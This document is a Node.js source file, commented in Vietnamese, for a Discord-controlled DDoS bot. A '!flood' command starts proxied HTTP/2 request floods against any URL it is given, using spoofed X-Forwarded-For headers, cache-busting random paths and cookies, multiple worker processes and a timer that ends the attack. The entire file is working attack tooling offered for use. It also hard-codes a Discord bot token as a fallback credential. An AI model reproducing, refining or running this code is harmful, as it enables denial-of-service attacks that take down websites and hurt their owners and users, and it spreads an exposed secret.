// bot.js - Discord DDoS Bot cho Render
console.log('🚀 Khởi động bot...');

process.on('uncaughtException', (err) => {
    console.log('❌ Lỗi:', err.message);
});
process.on('unhandledRejection', (err) => {
    console.log('❌ Lỗi:', err.message);
});

// ==================== DISCORD ====================
const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

// ==================== CONFIG ====================
const TOKEN = process.env.DISCORD_TOKEN || 'MTQ1NjU5ODMxNDI3NDM5NDE2NA.GbkPfw.WdIPLLnbEFUXMOdisLc_y-Dwsqzi8TrkLtrIdg'; // Dùng biến môi trường
const CHANNEL_ID = process.env.CHANNEL_ID || '1456595444477198508';

// ==================== KIỂM TRA ====================
if (!TOKEN || TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.log('❌ LỖI: Thiếu Discord Token!');
    console.log('📝 Cách fix:');
    console.log('1. Vào Render Dashboard');
    console.log('2. Chọn Environment Variables');
    console.log('3. Thêm DISCORD_TOKEN = token của bạn');
    process.exit(1);
}

// ==================== THƯ VIỆN ====================
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");

// ==================== TẢI PROXY ====================
let proxyList = [];
try {
    if (fs.existsSync('./proxy.txt')) {
        proxyList = fs.readFileSync('./proxy.txt', 'utf-8')
            .split('\n')
            .filter(line => line.includes(':'));
        console.log(`✅ Loaded ${proxyList.length} proxies from file`);
    } else {
        console.log('⚠️ Không có file proxy.txt, dùng direct connection');
        // Tạo proxy mẫu
        fs.writeFileSync('./proxy.txt', '# Thêm proxy vào đây, mỗi dòng ip:port\n');
    }
} catch (e) {
    console.log('⚠️ Lỗi đọc proxy:', e.message);
}

// ==================== RANDOM ====================
function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randomString(len) { return crypto.randomBytes(len).toString('hex').slice(0, len); }
function randomIP() { return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`; }

// ==================== TLS ====================
const secureContext = tls.createSecureContext({
    ciphers: "GREASE:ECDHE+AESGCM:ECDHE+CHACHA20",
    honorCipherOrder: true
});

// ==================== USER-AGENTS ====================
const uas = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0) Version/20.0 Mobile/15E148 Safari/604.1'
];

// ==================== NET SOCKET ====================
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\n\r\n`;
        const conn = net.connect(options.port, options.host, () => conn.write(payload));
        conn.setTimeout(3000);
        conn.on('data', d => {
            if (d.toString().includes('200')) callback(conn);
            else conn.destroy();
        });
        conn.on('error', () => callback(null));
        conn.on('timeout', () => conn.destroy());
    }
}

// ==================== FLOOD WORKER ====================
function createWorker(target, rate) {
    if (!target) return;
    
    const parsed = url.parse(target);
    const Socker = new NetSocket();
    let count = 0;
    
    const interval = setInterval(() => {
        if (count > 0 && process.send) process.send(count);
        count = 0;
    }, 1000);
    
    function flood() {
        if (proxyList.length === 0) {
            setTimeout(flood, 1000);
            return;
        }
        
        const proxy = randomElement(proxyList);
        const [ph, pp] = proxy.split(':');
        
        const headers = {
            ':method': 'GET',
            ':path': parsed.path + '?' + randomString(8),
            ':authority': parsed.host,
            'user-agent': randomElement(uas),
            'accept': '*/*',
            'x-forwarded-for': randomIP(),
            'cookie': randomString(20)
        };

        Socker.HTTP({ host: ph, port: parseInt(pp), address: parsed.host + ':443' }, (conn) => {
            if (!conn) return setTimeout(flood, 100);
            
            const tlsConn = tls.connect({
                socket: conn,
                servername: parsed.host,
                rejectUnauthorized: false,
                secureContext: secureContext
            });
            
            const client = http2.connect(parsed.href, { createConnection: () => tlsConn });
            
            client.on('connect', () => {
                for (let i = 0; i < rate; i++) {
                    try {
                        const req = client.request(headers);
                        req.end();
                        count++;
                    } catch (e) {}
                }
                setTimeout(() => client.close(), 100);
            });
            
            client.on('error', () => {});
        });
        
        setImmediate(flood);
    }
    
    flood();
    
    return () => {
        clearInterval(interval);
    };
}

// ==================== BOT DISCORD ====================
let currentAttack = null;
let workers = [];
let totalReqs = 0;

client.once('ready', () => {
    console.log(`✅ Bot ${client.user.tag} đã sẵn sàng!`);
    console.log(`📢 Channel ID: ${CHANNEL_ID}`);
    
    const channel = client.channels.cache.get(CHANNEL_ID);
    if (channel) {
        channel.send(`
**🚀 DDoS BOT READY**
\`!help\` để xem hướng dẫn
        `);
    } else {
        console.log(`❌ Không tìm thấy channel ${CHANNEL_ID}`);
    }
});

client.on('messageCreate', async (msg) => {
    if (msg.channel.id !== CHANNEL_ID || !msg.content.startsWith('!')) return;
    
    const args = msg.content.slice(1).split(' ');
    const cmd = args[0].toLowerCase();
    
    if (cmd === 'help') {
        msg.channel.send(`
**📚 LỆNH:**
\`!flood <url> <time> <rate> <threads>\`
VD: \`!flood https://example.com 60 100 5\`

\`!stop\` - Dừng tấn công
\`!status\` - Xem trạng thái
\`!proxy\` - Xem số proxy
\`!help\` - Hướng dẫn
        `);
    }
    
    else if (cmd === 'flood') {
        if (args.length < 5) {
            return msg.channel.send('❌ Thiếu tham số! VD: !flood https://example.com 60 100 5');
        }
        
        const target = args[1];
        const time = parseInt(args[2]);
        const rate = parseInt(args[3]);
        const threads = parseInt(args[4]);
        
        if (!target.startsWith('http')) {
            return msg.channel.send('❌ URL phải bắt đầu bằng http:// hoặc https://');
        }
        
        if (isNaN(time) || time < 10) {
            return msg.channel.send('❌ Thời gian phải >= 10 giây');
        }
        
        if (isNaN(rate) || rate < 1) {
            return msg.channel.send('❌ Rate phải >= 1');
        }
        
        if (isNaN(threads) || threads < 1) {
            return msg.channel.send('❌ Threads phải >= 1');
        }
        
        if (proxyList.length === 0) {
            return msg.channel.send('❌ Không có proxy! Thêm proxy vào file proxy.txt');
        }
        
        // Dừng attack cũ
        if (currentAttack) {
            workers.forEach(w => w.kill());
            workers = [];
        }
        
        msg.channel.send(`
**🔥 BẮT ĐẦU TẤN CÔNG**
Target: ${target}
Time: ${time}s
Rate: ${rate}
Threads: ${threads}
Proxy: ${proxyList.length}
        `);
        
        // Fork workers
        if (cluster.isMaster) {
            for (let i = 0; i < threads; i++) {
                const worker = cluster.fork();
                worker.send({ target, rate });
                workers.push(worker);
            }
            
            currentAttack = {
                target,
                time,
                startTime: Date.now()
            };
            
            totalReqs = 0;
            
            cluster.on('message', (worker, cnt) => {
                totalReqs += cnt || 0;
            });
            
            // Tự động kết thúc
            setTimeout(() => {
                if (currentAttack) {
                    workers.forEach(w => w.kill());
                    workers = [];
                    currentAttack = null;
                    
                    msg.channel.send(`✅ **KẾT THÚC TẤN CÔNG**\nTổng requests: ${totalReqs.toLocaleString()}`);
                }
            }, time * 1000);
        }
    }
    
    else if (cmd === 'stop') {
        if (currentAttack) {
            workers.forEach(w => w.kill());
            workers = [];
            currentAttack = null;
            msg.channel.send('🛑 **ĐÃ DỪNG TẤN CÔNG**');
        } else {
            msg.channel.send('⚠️ Không có attack nào đang chạy');
        }
    }
    
    else if (cmd === 'status') {
        if (currentAttack) {
            const elapsed = Math.floor((Date.now() - currentAttack.startTime) / 1000);
            const rps = Math.floor(totalReqs / (elapsed || 1));
            
            msg.channel.send(`
**📊 TRẠNG THÁI**
Thời gian: ${elapsed}s / ${currentAttack.time}s
Requests: ${totalReqs.toLocaleString()}
RPS: ${rps}
Workers: ${workers.length}
Proxy: ${proxyList.length}
            `);
        } else {
            msg.channel.send('📴 Không có attack nào');
        }
    }
    
    else if (cmd === 'proxy') {
        msg.channel.send(`📡 Số proxy: ${proxyList.length}`);
    }
});

// ==================== CHẠY BOT ====================
if (cluster.isMaster) {
    console.log('🔄 Đang đăng nhập Discord...');
    
    client.login(TOKEN).then(() => {
        console.log('✅ Đăng nhập thành công!');
    }).catch(err => {
        console.log('❌ Lỗi đăng nhập Discord:', err.message);
        console.log('\n📝 Cách fix:');
        console.log('1. Vào https://discord.com/developers/applications');
        console.log('2. Chọn bot của bạn');
        console.log('3. Reset token và copy token mới');
        console.log('4. Cập nhật token trong Environment Variables trên Render');
        process.exit(1);
    });
    
} else {
    process.on('message', (data) => {
        createWorker(data.target, data.rate);
    });
    }
